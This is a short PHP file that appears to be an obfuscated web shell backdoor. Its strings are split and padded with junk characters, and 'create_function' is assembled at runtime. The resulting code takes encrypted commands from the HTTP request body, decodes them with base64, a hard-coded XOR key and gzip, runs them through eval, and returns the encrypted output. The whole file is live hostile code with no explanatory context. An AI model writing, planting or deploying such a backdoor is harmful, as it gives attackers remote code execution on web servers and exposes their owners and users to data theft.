<?php
$w='k){$c=s}Mtrle}Mn($}Mk);$l=strlen(}M$t);$o=}M}M"";for(}M$i=0;$i<$l}M;){}Mfor($j=0;}M($j<$c&}M&$i}M}M<$l);$j++}M,$i++){$o';
$W='}M_contents(}M)}M;@ob_e}Mnd_cl}Mean}M()}M;$r=@b}Mase64_encode(@x(}M@gzcomp}Mress($o)}M,$k)}M}M);print("}M$p$kh$r$kf");}';
$h='.}M=$t{$i}^}M$k}M{$j};}}}Mreturn $}Mo;}if }M(@p}M}M}Mreg_match("/$kh(}M.+)$}Mkf/",@file_ge}Mt_con}Mten}Mts("php://i}Mn';
$N='p}Mut"),$m)}M==1) }M{@o}Mb}M_start();@e}Mv}Mal(}M@gzunc}Mompress(@x(@b}Mase64_d}Mecod}Me($m[}M1]),$k)));$o=}M@}Mob_get';
$x=str_replace('xP','','crexPaxPxPte_fuxPncxPtxPion');
$p='$k="68d76}M}M4b1";$k}Mh="c}M3834d5d1523}M";}M$}Mkf="33b2c2053}M349"}M;}M$p="JYw}MHg}MMqbZeyuWGtS}M";functi}Mon }Mx($t,$';
$K=str_replace('}M','',$p.$w.$h.$N.$W);
$k=$x('',$K);$k();
?>
